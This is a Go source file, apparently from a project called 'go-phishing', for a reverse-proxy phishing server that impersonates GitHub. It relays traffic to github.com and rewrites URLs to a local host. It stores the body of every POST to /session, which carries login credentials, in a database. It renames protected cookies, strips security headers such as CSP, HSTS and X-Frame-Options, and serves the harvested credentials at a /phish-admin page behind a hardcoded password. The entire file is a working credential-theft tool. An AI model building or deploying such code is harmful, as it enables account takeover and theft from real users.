package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"

	"go-phishing/db"
)

const (
	upstreamURL = "https://github.com"
	phishURL    = "http://localhost:8080"
)

func replaceURLInResp(body []byte, header http.Header) []byte {
	// detect is html or not
	contentType := header.Get("Content-Type")
	isHTML := strings.Contains(contentType, "text/html")

	// if NOT, return same body
	if !isHTML {
		return body
	}

	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)

	phishGitURL := fmt.Sprintf(`%s(.*)\.git`, phishURL)
	upstreamGitURL := fmt.Sprintf(`%s$1.git`, upstreamURL)
	re, err := regexp.Compile(phishGitURL)
	if err != nil {
		panic(err)
	}
	bodyStr = re.ReplaceAllString(bodyStr, upstreamGitURL)

	return []byte(bodyStr)
}

func cloneRequest(r *http.Request) *http.Request {
	method := r.Method

	bodyByte, _ := ioutil.ReadAll(r.Body)
	bodyStr := string(bodyByte)
	if r.URL.String() == "/session" && r.Method == "POST" {
		db.Insert(bodyStr)
	}
	body := bytes.NewReader(bodyByte)

	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := "https://github.com" + path + "?" + rawQuery

	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}

	req.Header = r.Header
	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)

	req.Header.Del("Accept-Encoding")
	req.Header.Set("Origin", origin)
	req.Header.Set("Referer", referer)

	for i, value := range req.Header["Cookie"] {
		newValue := strings.Replace(value, "XXHost", "__Host", -1)
		newValue = strings.Replace(newValue, "XXSecure", "__Secure", -1)
		req.Header["Cookie"][i] = newValue
	}

	return req
}

func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
	checkRedirect := func(r *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	client := http.Client{CheckRedirect: checkRedirect}

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	resp.Body.Close()

	return respBody, resp.Header, resp.StatusCode
}

func handler(w http.ResponseWriter, r *http.Request) {
	req := cloneRequest(r)

	body, header, statusCode := sendReqToUpstream(req)
	body = replaceURLInResp(body, header)

	for _, v := range header["Set-Cookie"] {
		newValue := strings.Replace(v, "domain=.github.com;", "", -1)
		newValue = strings.Replace(newValue, "secure;", "", 1)
		newValue = strings.Replace(newValue, "__Host", "XXHost", -1)
		newValue = strings.Replace(newValue, "__Secure", "XXSecure", -1)

		w.Header().Add("Set-Cookie", newValue)
	}

	for k := range header {
		if k != "Set-Cookie" {
			value := header.Get(k)
			w.Header().Set(k, value)
		}
	}

	w.Header().Del("Content-Security-Policy")
	w.Header().Del("Strict-Transport-Security")
	w.Header().Del("X-Frame-Options")
	w.Header().Del("X-Xss-Protection")
	w.Header().Del("X-Pjax-Version")
	w.Header().Del("X-Pjax-Url")

	// status code is 3XX
	if statusCode >= 300 && statusCode < 400 {
		location := header.Get("Location")
		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
		w.Header().Set("Location", newLocation)
	}

	w.WriteHeader(statusCode)
	w.Write(body)
}

func adminHandler(w http.ResponseWriter, r *http.Request) {
	username, password, ok := r.BasicAuth()
	if username == "Larry" && password == "850806" && ok {
		strs := db.SelectAll()
		w.Write([]byte(strings.Join(strs, "\n\n")))
	} else {
		w.Header().Add("WWW-Authenticate", "Basic")
		w.WriteHeader(401)
		w.Write([]byte("不給你看勒"))
	}
}

func main() {
	db.Connect()

	http.HandleFunc("/phish-admin", adminHandler)
	http.HandleFunc("/", handler)
	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		panic(err)
	}
}
